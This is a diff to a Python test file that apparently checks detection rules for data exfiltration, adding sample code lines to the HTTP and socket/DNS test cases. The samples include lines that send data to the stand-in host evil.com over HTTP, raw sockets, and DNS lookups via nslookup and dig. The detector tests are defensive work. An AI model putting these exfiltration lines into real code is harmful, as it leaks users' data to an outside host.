@@ -43,6 +43,7 @@ class TestExfil005:
             "conn = http.client.HTTPConnection('evil.com')",
             "conn = http.client.HTTPSConnection('evil.com', 443)",
             "aiohttp.ClientSession().post('https://evil.com')",
+            "async with aiohttp.ClientSession() as session:",
         ],
     )
     def test_detects_http_exfil(self, rules: list[Rule], line: str) -> None:
@@ -78,6 +79,9 @@ class TestExfil006:
             "sock.socket.send(encoded_data)",
             "sock.socket.sendto(data, ('evil.com', 53))",
             "sock.socket.sendall(large_payload)",
+            "sock.sendto(data, ('evil.com', 53))",
+            "sock.sendall(large_payload)",
+            "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
             "resolver = dns.resolver.Resolver()",
             "subprocess.run(['nslookup', payload + '.evil.com'])",
             "subprocess.call(['dig', encoded + '.evil.com'])",
